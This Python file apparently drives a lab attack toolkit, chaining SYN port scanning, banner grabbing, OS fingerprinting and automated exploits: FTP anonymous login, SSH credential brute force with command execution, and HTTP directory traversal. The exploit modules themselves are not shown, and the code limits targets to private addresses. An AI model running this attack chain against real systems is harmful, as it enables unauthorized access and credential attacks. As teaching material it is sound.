"""
Attack toolkit orchestrator.

Chains all phases of the reconnaissance + exploitation lifecycle:
    Phase 1: TCP SYN port scanning (raw packets via Npcap)
    Phase 2: Service banner grabbing (standard TCP sockets)
    Phase 3: OS fingerprinting (heuristic analysis of SYN/ACK features)
    Phase 5: Exploit execution (FTP anonymous, SSH brute, HTTP traversal)

Usage (from Administrator PowerShell):
    python attacker\\main.py ^
        --adapter "<NPCAP ADAPTER>" ^
        --target 192.168.1.25 ^
        --ports 21 22 80 443 445 3389

    Optional flags:
        --skip-exploits     Run only scanning/fingerprinting
        --skip-banners      Skip banner grabbing phase
        --exploit-delay 2   Seconds between exploit attempts
"""

import sys
from pathlib import Path

# The orchestrator prints box-drawing / arrow / check glyphs. The default
# Windows console code page (cp1252/cp437) cannot encode these and would
# raise UnicodeEncodeError mid-run. Force UTF-8 output with graceful
# fallback so the tool runs on any console.
for _stream in (sys.stdout, sys.stderr):
    try:
        _stream.reconfigure(encoding="utf-8", errors="replace")
    except (AttributeError, ValueError):
        pass

# Ensure project root is on the path.
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import argparse
import ipaddress
import random
import time

from common.packet import (
    build_syn_frame, parse_ipv4_tcp_frame, TCP_ACK, TCP_RST, TCP_SYN,
)
from common.npcap import Pcap, local_ipv4_for_target, local_mac_for_ip, arp_resolve
from fingerprint import fingerprint
from banner import grab_banners
from exploits import ftp_anon, ssh_bruteforce, http_traversal


MAX_PROBES = 50
MIN_DELAY = 0.2

SEPARATOR = "═" * 65
SUB_SEP = "─" * 65


def phase1_scan(args, local_ip, src_mac, dst_mac):
    """Phase 1: TCP SYN port scanning."""
    print(f"\n{SEPARATOR}")
    print("  [PHASE 1] TCP SYN Port Scanning")
    print(SEPARATOR)
    print(f"  Target      : {args.target}")
    print(f"  Attacker IP : {local_ip}")
    print(f"  Attacker MAC: {src_mac}")
    print(f"  Target MAC  : {dst_mac}")
    print(f"  Ports       : {len(args.ports)}")
    print(f"  Delay       : {args.delay:.2f}s")
    print(SUB_SEP)

    rng = random.Random(args.seed)
    observations = []
    fingerprint_candidate = None

    with Pcap(args.adapter, snaplen=65535, promisc=True, timeout_ms=100) as cap:
        for index, port in enumerate(args.ports):
            src_port = args.source_port + index
            seq = rng.randrange(1, 0xFFFFFFFF)

            frame = build_syn_frame(
                src_mac, dst_mac,
                local_ip, args.target,
                src_port, port,
                seq,
            )

            sent_at = time.monotonic()
            cap.send(frame)

            result = None
            state = "NO RESPONSE / POSSIBLY FILTERED"
            deadline = sent_at + args.timeout

            while time.monotonic() < deadline:
                raw = cap.recv()
                if raw is None:
                    continue

                info = parse_ipv4_tcp_frame(raw)
                if not info:
                    continue

                if not (
                    info["src_ip"] == args.target
                    and info["dst_ip"] == local_ip
                    and info["src_port"] == port
                    and info["dst_port"] == src_port
                ):
                    continue

                flags = info["flags"]

                if (flags & TCP_SYN) and (flags & TCP_ACK):
                    state = "OPEN"
                    result = info
                    fingerprint_candidate = info
                    break

                if flags & TCP_RST:
                    state = "CLOSED"
                    result = info
                    break

            observations.append((port, state, result))

            if result:
                print(
                    f"  {port:5d}  {state:30s} "
                    f"TTL={result['ttl']:3d} "
                    f"WIN={result['window']}"
                )
            else:
                print(f"  {port:5d}  {state}")

            time.sleep(args.delay)

    return observations, fingerprint_candidate


def phase2_banners(args, open_ports):
    """Phase 2: Service banner grabbing."""
    print(f"\n{SEPARATOR}")
    print("  [PHASE 2] Service Banner Grabbing")
    print(SEPARATOR)

    if not open_ports:
        print("  No open ports found — skipping banner grabbing.")
        return []

    results = grab_banners(args.target, open_ports, timeout=5.0)

    for r in results:
        status = "✓" if r["success"] else "✗"
        print(
            f"  {status} {r['port']:5d}  {r['service']:8s} → {r['version'][:60]}"
        )

    return results


def phase3_fingerprint(fingerprint_candidate):
    """Phase 3: OS fingerprinting."""
    print(f"\n{SEPARATOR}")
    print("  [PHASE 3] OS Fingerprinting")
    print(SEPARATOR)

    if not fingerprint_candidate:
        print("  No SYN/ACK was observed — OS fingerprint not available.")
        return None

    fp = fingerprint(fingerprint_candidate)

    print(f"  Likely OS  : {fp['os']}")
    print(f"  Confidence : {fp['confidence']}%")
    print(f"  Version    : {fp['version']}")
    if fp.get("version_tiers"):
        for tier, pct in fp["version_tiers"]:
            print(f"               {pct:3d}%  {tier}")
    print(f"  TTL        : {fp['ttl']} (initial {fp['initial_ttl']}, "
          f"~{fp['hops']} hop(s))")
    print(f"  Window     : {fp['window']}")
    print(f"  DF bit     : {'set' if fp['df'] else 'clear'}")
    print(f"  Options    : {', '.join(str(x) for x in fp['options']) or 'none'}")
    print(f"  Probability:")
    for cls, pct in fp["distribution"]:
        bar = "#" * (pct // 5)
        print(f"    {cls:16s} {pct:3d}%  {bar}")
    print(f"  Evidence   :")
    for reason in fp["reasons"]:
        print(f"    - {reason}")

    return fp


def phase5_exploits(args, open_ports, banner_results):
    """Phase 5: Exploit execution."""
    print(f"\n{SEPARATOR}")
    print("  [PHASE 5] Exploit Execution")
    print(SEPARATOR)

    banner_map = {}
    for b in banner_results:
        banner_map[b["port"]] = b

    exploit_results = []

    # Exploit 1: FTP Anonymous Login
    if 21 in open_ports:
        print(f"\n  {SUB_SEP}")
        print(f"  [EXPLOIT] FTP Anonymous Login (port 21)")
        print(f"  {SUB_SEP}")

        ftp_result = ftp_anon.run(
            args.target, port=21, banner_info=banner_map.get(21)
        )
        exploit_results.append(ftp_result)

        status = "SUCCESS ✓" if ftp_result["success"] else "FAILED ✗"
        print(f"  Status  : {status}")
        print(f"  Detail  : {ftp_result['detail']}")
        if ftp_result["success"]:
            print(f"  Work Dir: {ftp_result['working_dir']}")
            if ftp_result["files"]:
                print(f"  Files   :")
                for f in ftp_result["files"][:10]:
                    print(f"    {f}")

        time.sleep(args.exploit_delay)

    # Exploit 2: SSH Weak Credentials
    if 22 in open_ports:
        print(f"\n  {SUB_SEP}")
        print(f"  [EXPLOIT] SSH Weak Credentials (port 22)")
        print(f"  {SUB_SEP}")

        ssh_result = ssh_bruteforce.run(
            args.target, port=22, banner_info=banner_map.get(22),
            delay=1.0,
        )
        exploit_results.append(ssh_result)

        status = "SUCCESS ✓" if ssh_result["success"] else "FAILED ✗"
        print(f"  Status   : {status}")
        print(f"  Detail   : {ssh_result['detail']}")
        print(f"  Attempts : {ssh_result['attempts']}")
        if ssh_result["success"] and ssh_result["command_output"]:
            print(f"  Commands :")
            for cmd, output in ssh_result["command_output"].items():
                print(f"    {cmd} → {output[:80]}")

        time.sleep(args.exploit_delay)

    # Exploit 3: HTTP Directory Traversal
    http_ports = [p for p in open_ports if p in (80, 8080, 8443)]
    for http_port in http_ports:
        print(f"\n  {SUB_SEP}")
        print(f"  [EXPLOIT] HTTP Directory Traversal (port {http_port})")
        print(f"  {SUB_SEP}")

        http_result = http_traversal.run(
            args.target, port=http_port, banner_info=banner_map.get(http_port),
        )
        exploit_results.append(http_result)

        status = "SUCCESS ✓" if http_result["success"] else "FAILED ✗"
        print(f"  Status   : {status}")
        print(f"  Detail   : {http_result['detail']}")
        print(f"  Payloads : {http_result['attempted']} attempted")
        if http_result["success"]:
            for payload in http_result["successful_payloads"]:
                print(f"  Payload  : {payload['payload']}")
                print(f"  Preview  : {payload['body_preview'][:120]}...")

        time.sleep(args.exploit_delay)

    if not exploit_results:
        print("\n  No applicable exploits for the discovered open ports.")

    return exploit_results


def print_summary(observations, banner_results, fp_result, exploit_results):
    """Print a final summary of all findings."""
    print(f"\n\n{SEPARATOR}")
    print("  ATTACK SUMMARY")
    print(SEPARATOR)

    # Port scan summary
    open_count = sum(1 for _, s, _ in observations if s == "OPEN")
    closed_count = sum(1 for _, s, _ in observations if s == "CLOSED")
    filtered_count = sum(
        1 for _, s, _ in observations if "FILTERED" in s or "NO RESPONSE" in s
    )
    print(f"  Ports scanned : {len(observations)}")
    print(f"  Open          : {open_count}")
    print(f"  Closed        : {closed_count}")
    print(f"  Filtered/NR   : {filtered_count}")

    # Banner summary
    banner_success = sum(1 for b in banner_results if b["success"])
    print(f"  Banners found : {banner_success}/{len(banner_results)}")

    # OS fingerprint
    if fp_result:
        print(f"  OS guess      : {fp_result['os']} ({fp_result['confidence']}%)")

    # Exploits
    if exploit_results:
        success_count = sum(1 for e in exploit_results if e["success"])
        print(f"  Exploits      : {success_count}/{len(exploit_results)} successful")
        for e in exploit_results:
            marker = "✓" if e["success"] else "✗"
            print(f"    {marker} {e['name']} (port {e['port']})")

    print(SEPARATOR)


def main():
    p = argparse.ArgumentParser(
        description=(
            "Custom port scanner + OS fingerprinter + exploit toolkit. "
            "Demonstrates the full reconnaissance → exploitation chain."
        )
    )

    p.add_argument("--adapter", required=True,
                    help="Exact Npcap adapter name")
    p.add_argument("--target", required=True,
                    help="One explicitly authorized private IPv4 target")
    p.add_argument("--ports", required=True, nargs="+", type=int,
                    help="Ports to scan (max 50)")
    p.add_argument("--timeout", type=float, default=1.5,
                    help="Per-port SYN timeout in seconds (default: 1.5)")
    p.add_argument("--delay", type=float, default=0.5,
                    help="Delay between SYN probes in seconds (default: 0.5)")
    p.add_argument("--source-port", type=int, default=40000,
                    help="Starting source port for probes (default: 40000)")
    p.add_argument("--seed", type=int, default=406,
                    help="RNG seed for sequence numbers (default: 406)")
    p.add_argument("--skip-banners", action="store_true",
                    help="Skip banner grabbing phase")
    p.add_argument("--skip-exploits", action="store_true",
                    help="Skip exploit execution phase")
    p.add_argument("--exploit-delay", type=float, default=1.0,
                    help="Delay between exploit attempts (default: 1.0)")

    args = p.parse_args()

    # Validate inputs.
    target_ip = ipaddress.ip_address(args.target)
    if target_ip.version != 4 or not target_ip.is_private:
        raise SystemExit("Safety limit: target must be a private IPv4 address.")
    if len(args.ports) > MAX_PROBES:
        raise SystemExit(f"Safety limit: at most {MAX_PROBES} ports per run.")
    if args.source_port + len(args.ports) - 1 > 65535:
        raise SystemExit("Source port range exceeds 65535.")
    if args.delay < MIN_DELAY:
        raise SystemExit(f"Safety limit: --delay must be >= {MIN_DELAY}s.")
    if any(not 1 <= x <= 65535 for x in args.ports):
        p.error("Every port must be between 1 and 65535.")
    if not 0.1 <= args.timeout <= 10:
        p.error("--timeout must be between 0.1 and 10 seconds.")

    # Resolve network details.
    local_ip = local_ipv4_for_target(args.target)
    src_mac = local_mac_for_ip(local_ip)
    dst_mac = arp_resolve(args.target, local_ip)

    print(SEPARATOR)
    print("  CUSTOM PORT SCANNER — ATTACK TOOLKIT")
    print(SEPARATOR)
    print(f"  Target       : {args.target}")
    print(f"  Attacker     : {local_ip} ({src_mac})")
    print(f"  Target MAC   : {dst_mac}")
    print(f"  Ports        : {args.ports}")
    print(f"  Scan delay   : {args.delay}s")

    # Phase 1: SYN Port Scanning
    observations, fp_candidate = phase1_scan(args, local_ip, src_mac, dst_mac)
    open_ports = [port for port, state, _ in observations if state == "OPEN"]

    # Phase 2: Banner Grabbing
    banner_results = []
    if not args.skip_banners and open_ports:
        banner_results = phase2_banners(args, open_ports)
    elif args.skip_banners:
        print(f"\n  [PHASE 2] Banner grabbing skipped (--skip-banners)")

    # Phase 3: OS Fingerprinting
    fp_result = phase3_fingerprint(fp_candidate)

    # Phase 5: Exploit Execution
    exploit_results = []
    if not args.skip_exploits and open_ports:
        exploit_results = phase5_exploits(args, open_ports, banner_results)
    elif args.skip_exploits:
        print(f"\n  [PHASE 5] Exploit execution skipped (--skip-exploits)")

    # Final summary
    print_summary(observations, banner_results, fp_result, exploit_results)


if __name__ == "__main__":
    main()
